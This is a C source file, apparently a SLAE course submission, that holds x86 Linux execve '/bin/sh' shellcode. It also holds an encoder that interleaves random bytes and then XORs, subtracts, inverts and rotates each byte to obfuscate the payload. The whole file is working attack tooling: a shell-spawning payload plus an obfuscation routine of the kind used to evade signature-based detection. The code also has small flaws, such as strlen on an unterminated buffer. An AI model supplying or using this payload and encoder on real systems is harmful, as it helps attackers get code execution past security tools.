# Title 		: Linux/x86 - Encoder - Random Bytes + XOR/SUB/NOT/ROR
# Author		: Xenofon Vassilakopoulos 
# Date			: December, 2019
# Tested on		: Linux kali 5.3.0-kali2-686-pae #1 SMP Debian 5.3.9-3kali1 (2019-11-20) i686 GNU/Linux
# Architecture		: i686 GNU/Linux
# SLAE-ID 		: SLAE - 1314 

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define DEC 0x2 // the value that will be used to substract every byte
#define XORVAL 0x2c // the value that will be used to xor with every byte

// execve stack shellcode /bin/sh
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void main()
{
        int rot = 4; //right rotation 4 bits
        printf("\n\nShellcode:\n\n");
        int o;
        for (o=0; o<strlen(shellcode); o++) {
                printf("\\x%02x", shellcode[o]);
        }
        printf("\n\nShellcode Length %d\n",sizeof(shellcode)-1);
        printf("\n\nDecoded Shellcode:\n\n");
        o=0;
        for (o; o<strlen(shellcode); o++) {
                printf("0x%02x,", shellcode[o]);
        }
        printf("\n");
        int i;
        unsigned char *buffer = (char*)malloc(sizeof(shellcode)*2);
        srand((unsigned int)time(NULL));
        unsigned char *shellcode2=(char*)malloc(sizeof(shellcode)*2);
        // placeholder to copy the random bytes using rand
        unsigned char shellcode3[] = "\xbb";
        int l = 0;
        
         int k = 0;
        int j;

        // random byte insertion into even location
        printf("\nInsertion encoded shellcode\n\n");
              for (i=0; i<(strlen(shellcode)*2); i++) {
                // generate random bytes
                buffer[i] = rand() & 0xff;
                memcpy(&shellcode3[0],(unsigned char*)&buffer[i],sizeof(buffer[i]));
                k = i % 2;
                if (k == 0)
                {
                        shellcode2[i] = shellcode[l];
                        l++;
                }
                else
                {
                        shellcode2[i] = shellcode3[0];
                }

        printf("0x%02x,", shellcode2[i]);

        }
  // apply the encoding scheme
        for (i=0; i<strlen(shellcode2); i++) {
                // XOR every byte with 0x2c
                shellcode2[i] = shellcode2[i] ^ XORVAL;
                // decrease every byte by 2
                shellcode2[i] = shellcode2[i] - DEC;
                // one's complement
                shellcode2[i] = ~shellcode2[i];
                // perform the ror method
                shellcode2[i] = (shellcode2[i] << rot) | (shellcode2[i] >> sizeof(shellcode2[i])*(8-rot));
        }

        // print encoded shellcode
        printf("\n\nEncoded shellcode\n\n");
        i=0;
        for (i; i<strlen(shellcode2); i++) {
                printf("0x%02x,", shellcode2[i]);
        }
        printf("\n\nEncoded Shellcode Length %d\n",strlen(shellcode2));
        free(shellcode2);
        free(buffer);
        printf("\n\n");
}

        
        
        
